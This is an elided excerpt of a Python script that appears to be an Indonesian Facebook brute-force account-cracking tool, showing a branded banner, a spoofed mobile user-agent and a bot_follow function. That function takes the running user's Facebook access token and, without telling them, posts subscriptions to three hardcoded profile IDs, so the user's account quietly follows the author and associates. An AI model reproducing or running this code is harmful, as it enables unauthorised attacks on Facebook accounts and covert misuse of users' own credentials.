...
def banner():
    print("""\x1b[0;37m   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By S4F1K  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")
...
def gen():
        ...
        try:
                ...
                "user-agent"                : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
...
def bot_follow():
	...
	requests.post("https://graph.facebook.com/100049252740120/subscribers?access_token=" + toket)      # Syafik X
	requests.post("https://graph.facebook.com/100034461403746/subscribers?access_token=" + toket)      # Gita anwar
	requests.post("https://graph.facebook.com/100006702878868/subscribers?access_token=" + toket) # Almira Gabrielle X
	menu()
